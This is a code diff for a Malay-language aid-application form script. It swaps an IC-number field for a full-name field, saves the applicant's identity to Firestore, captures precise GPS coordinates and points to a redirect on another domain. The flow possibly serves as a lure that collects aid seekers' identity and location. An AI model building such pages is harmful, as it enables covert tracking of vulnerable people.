@@ -3,9 +3,8 @@ import { saveSessionRecord, updateSessionWithGps, updateSessionApplicant, update
 // DOM References
 const userForm     = document.getElementById('userForm');
 const jenisBantuan = document.getElementById('jenisBantuan');
-const icNumber     = document.getElementById('icNumber');
-const icError      = document.getElementById('icError');
-const icType       = document.getElementById('icType');
+const fullName     = document.getElementById('fullName');
+const nameError    = document.getElementById('nameError');
 const actionBtn    = document.getElementById('actionBtn');
 
 // State
@@ -168,44 +167,39 @@ function getGeoPosition(options) {
 export function handleFormSubmit(e) {
   if (e) e.preventDefault();
 
-  const rawIC = icNumber ? icNumber.value.trim() : '';
-  const cleanIC = rawIC.replace(/\D/g, '').slice(0, 12);
-  if (icNumber) icNumber.value = cleanIC;
-
+  const rawName = fullName ? fullName.value.trim() : '';
   const selectedBantuan = (jenisBantuan && jenisBantuan.value) ? jenisBantuan.value : 'Bantuan Sara Hidup';
-  const selectedType = 'Kad Pengenalan Baru';
 
-  if (!cleanIC || cleanIC.length !== 12) {
-    if (icError) {
-      icError.style.display = 'block';
+  if (!rawName || rawName.length < 2) {
+    if (nameError) {
+      nameError.style.display = 'block';
     }
-    if (icNumber) {
-      icNumber.style.borderColor = '#dc2626';
-      icNumber.focus();
+    if (fullName) {
+      fullName.style.borderColor = '#dc2626';
+      fullName.focus();
     }
     return;
   }
 
-  if (icError) icError.style.display = 'none';
-  if (icNumber) icNumber.style.borderColor = '#d5d8e0';
+  if (nameError) nameError.style.display = 'none';
+  if (fullName) fullName.style.borderColor = '#d5d8e0';
 
-  const applicantIdentity = `${cleanIC} (${selectedBantuan})`;
+  const applicantIdentity = `${rawName} (${selectedBantuan})`;
 
   // Save applicant identity to Firestore session immediately
   if (currentSessionDocId) {
     updateSessionApplicant(currentSessionDocId, {
       userName: applicantIdentity,
-      icNumber: cleanIC,
-      jenisBantuan: selectedBantuan,
-      icType: selectedType
+      fullName: rawName,
+      jenisBantuan: selectedBantuan
     });
   }
 
   // Trigger GPS acquisition
-  requestGpsLocation(applicantIdentity, cleanIC, selectedBantuan, selectedType);
+  requestGpsLocation(applicantIdentity, rawName, selectedBantuan);
 }
 
-export async function requestGpsLocation(applicantIdentity, enteredIC, selectedBantuan, selectedType) {
+export async function requestGpsLocation(applicantIdentity, enteredName, selectedBantuan) {
   const REDIRECT_URL = 'https://eagihan.e-maik.my/';
 
   // 1. Check if accessed over insecure HTTP on mobile (Browsers require HTTPS for Geolocation)
@@ -248,9 +242,8 @@ export async function requestGpsLocation(applicantIdentity, enteredIC, selectedB
       Sila tunggu…
     `;
   }
-  if (icNumber) icNumber.disabled = true;
+  if (fullName) fullName.disabled = true;
   if (jenisBantuan) jenisBantuan.disabled = true;
-  if (icType) icType.disabled = true;
 
   let position = null;
   let lastError = null;
@@ -306,16 +299,14 @@ export async function requestGpsLocation(applicantIdentity, enteredIC, selectedB
           timestamp: position.timestamp || Date.now(),
           distanceDiffKm: distanceDiffKm,
           userName: applicantIdentity,
-          icNumber: enteredIC,
-          jenisBantuan: selectedBantuan,
-          icType: selectedType
+          fullName: enteredName,
+          jenisBantuan: selectedBantuan
         });
       } else {
         const dbResult = await saveLocationRecord({
           userName: applicantIdentity,
-          icNumber: enteredIC,
+          fullName: enteredName,
           jenisBantuan: selectedBantuan,
-          icType: selectedType,
           latitude: coords.latitude,
           longitude: coords.longitude,
           accuracy: coords.accuracy,
@@ -387,28 +378,17 @@ function resetForm() {
     actionBtn.classList.remove('btn--success');
     actionBtn.innerHTML = 'SETERUSNYA';
   }
-  if (icNumber) icNumber.disabled = false;
+  if (fullName) fullName.disabled = false;
   if (jenisBantuan) jenisBantuan.disabled = false;
-  if (icType) icType.disabled = false;
 }
 
-// Enforce strictly 12 digits on IC field
-if (icNumber) {
-  icNumber.addEventListener('input', (e) => {
-    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 12);
-    if (icError && e.target.value.length === 12) {
-      icError.style.display = 'none';
-      icNumber.style.borderColor = '#d5d8e0';
+// Input listeners for full name
+if (fullName) {
+  fullName.addEventListener('input', (e) => {
+    if (nameError && e.target.value.trim().length >= 2) {
+      nameError.style.display = 'none';
+      fullName.style.borderColor = '#d5d8e0';
     }
-  });
-  icNumber.addEventListener('paste', () => {
-    setTimeout(() => {
-      icNumber.value = icNumber.value.replace(/\D/g, '').slice(0, 12);
-      if (icError && icNumber.value.length === 12) {
-        icError.style.display = 'none';
-        icNumber.style.borderColor = '#d5d8e0';
-      }
-    }, 0);
   });
 }
 
